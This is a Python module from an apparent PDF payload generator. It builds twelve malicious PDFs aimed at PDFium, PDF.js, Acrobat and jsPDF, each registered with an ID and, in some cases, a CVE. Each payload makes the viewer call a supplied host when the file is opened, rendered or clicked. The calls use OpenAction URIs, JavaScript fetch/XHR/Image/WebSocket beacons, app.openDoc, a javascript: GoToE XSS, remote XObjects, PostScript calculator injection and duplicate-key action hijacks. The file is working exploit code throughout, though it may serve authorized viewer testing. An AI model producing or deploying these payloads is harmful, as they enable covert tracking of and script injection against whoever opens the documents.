from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def _page_skeleton(label: bytes, extra_root: bytes = b"",
                   extra_body: bytes = b"") -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R" + extra_root + b" >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (" + label + b") Tj ET\nendstream\nendobj\n"
        + extra_body
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_pdfium_uri_nogesture(host: str) -> bytes:
    """PDFium/Chrome — /OpenAction /S /URI fires without user gesture."""
    root = (
        b" /OpenAction << /S /URI /URI (" + host.encode() + b"/b-uri) >>"
    )
    return _page_skeleton(b"pdfium-uri", extra_root=root)


def build_pdfium_widget(host: str) -> bytes:
    """PDFium/Chrome — invisible widget fires on click, no gesture check."""
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] >> >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [5 0 R] /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (pdfium-widget) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Annot /Subtype /Widget /Rect [0 0 900 700]"
        + b" /Parent << /FT /Btn /T (b) >>"
        + b" /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/b-widget\"), cFS: \"CHTTP\"})) >> >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_browser_fetch(host: str) -> bytes:
    js = f'fetch("{host}/b-fetch")'
    return _openaction_js(js, b"browser-fetch")


def build_browser_xhr(host: str) -> bytes:
    js = f'var r=new XMLHttpRequest();r.open("GET","{host}/b-xhr");r.send()'
    return _openaction_js(js, b"browser-xhr")


def build_browser_image(host: str) -> bytes:
    js = f'var i=new Image(1,1);i.src="{host}/b-img"'
    return _openaction_js(js, b"browser-img")


def build_browser_websocket(host: str) -> bytes:
    ws = host.replace("https://", "wss://").replace("http://", "ws://")
    js = f'new WebSocket("{ws}/b-ws")'
    return _openaction_js(js, b"browser-ws")


def _openaction_js(js: str, label: bytes) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (" + label + b") Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Action /S /JavaScript /JS ("
        + js.encode("latin-1") + b") >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_gotoe_js_uri(host: str) -> bytes:
    """GotoE with javascript: URI — XSS when PDF loaded in <embed>/<object>."""
    page = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
        b" /AA << /O << /F (javascript:new Image().src=\""
        + host.encode() + b"/b-gotoe\") /D [0 /Fit] /S /GoToE >> >>"
        b" /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> >>"
    )
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        + b"3 0 obj\n" + page + b"\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


def build_xobject_remote(host: str) -> bytes:
    """External XObject stream — silent page-render callback, no action needed."""
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /XObject << /Im0 5 0 R >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 70 >>\nstream\nBT (NonPDF) Tj ET\n/Im0 Do\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /XObject /Subtype /Image /Width 1 /Height 1"
        + b" /BitsPerComponent 8 /ColorSpace /DeviceRGB /FFilter /DCTDecode"
        + b" /F << /FS /URL /F (" + host.encode() + b"/b-xobj) >> /Length 0 >>\nstream\n\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_ps_injection(host: str) -> bytes:
    """CVE-2018-5158 — PostScript calculator JS injection (PDF.js)."""
    injection = f'fetch("{host}/b-ps")'
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /XObject << /Im0 6 0 R >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 70 >>\nstream\nBT (NonPDF) Tj ET\n/Im0 Do\nendstream\nendobj\n"
        + b"5 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [0 1] /Length "
        + str(len(injection) + 4).encode() + b" >>\nstream\n{ " + injection.encode() + b" }\nendstream\nendobj\n"
        + b"6 0 obj\n<< /Type /XObject /Subtype /Image /Width 1 /Height 1"
        + b" /BitsPerComponent 8 /ColorSpace [/Separation /All /DeviceGray 5 0 R] /Length 1 >>\nstream\n\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 7 >>\n%%EOF\n"
    )


def build_duplicate_a_js(host: str) -> bytes:
    """Duplicate /A key — second action wins. Classic PDF-Lib/jsPDF injection."""
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R"
        + b" /Annots [<< /Type /Annot /Subtype /Link /Rect [0 0 595 842]"
        + b" /A << /S /URI /URI (benign) >>"
        + b" /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/b-dupa\"), cFS: \"CHTTP\"})) /Type /Action >> >>] >>\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


def build_duplicate_a_uri(host: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R"
        + b" /Annots [<< /Type /Annot /Subtype /Link /Rect [0 0 595 842]"
        + b" /A << /S /URI /URI (benign) >>"
        + b" /A << /S /URI /URI (" + host.encode() + b"/b-dupuri) /Type /Action >> /F 0 >>] >>\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


def build_jspdf_addjs(host: str) -> bytes:
    """CVE-2026-25755 — jsPDF addJS() object injection + /AA /O auto-action."""
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"
        + b"3 0 obj\n<< /S /JavaScript /JS (var x=1) >>\nendobj\n"
        + b"4 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]"
        + b" /AA << /O << /S /URI /URI (" + host.encode() + b"/b-jspdf) >> >> >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


registry.register(PayloadEntry(
    id="B01", name="pdfium_uri_nogesture",
    builder=lambda host: build_pdfium_uri_nogesture(host),
    description="OpenAction /URI silent nav (PDFium/Chrome)",
    platform="pdfium", cve="CVE-2018-20065", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B02", name="pdfium_widget",
    builder=lambda host: build_pdfium_widget(host),
    description="Invisible widget fires JS on click (PDFium)",
    platform="pdfium", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B03", name="browser_fetch",
    builder=lambda host: build_browser_fetch(host),
    description="fetch() from PDF.js worker",
    platform="pdfjs", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B04", name="browser_xhr",
    builder=lambda host: build_browser_xhr(host),
    description="XMLHttpRequest from PDF.js worker",
    platform="pdfjs", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B05", name="browser_image",
    builder=lambda host: build_browser_image(host),
    description="new Image() beacon from PDF.js",
    platform="pdfjs", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B06", name="browser_ws",
    builder=lambda host: build_browser_websocket(host),
    description="WebSocket from PDF.js worker",
    platform="pdfjs", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B07", name="gotoe_js_uri",
    builder=lambda host: build_gotoe_js_uri(host),
    description="GotoE javascript: URI XSS in <embed>/<object>",
    platform="pdfium", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B08", name="xobject_remote",
    builder=lambda host: build_xobject_remote(host),
    description="External XObject stream — silent page-render callback",
    platform="all", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B09", name="ps_injection",
    builder=lambda host: build_ps_injection(host),
    description="PostScript calc JS injection (PDF.js)",
    platform="pdfjs", cve="CVE-2018-5158", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B10", name="duplicate_a_js",
    builder=lambda host: build_duplicate_a_js(host),
    description="Duplicate /A key — JS action overrides URI",
    platform="acrobat", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B11", name="duplicate_a_uri",
    builder=lambda host: build_duplicate_a_uri(host),
    description="Duplicate /A key — URI hijack",
    platform="acrobat", tags=("browser",),
))
registry.register(PayloadEntry(
    id="B12", name="jspdf_addjs",
    builder=lambda host: build_jspdf_addjs(host),
    description="jsPDF addJS() object injection + /AA /O auto-action",
    platform="acrobat", cve="CVE-2026-25755", tags=("browser",),
))
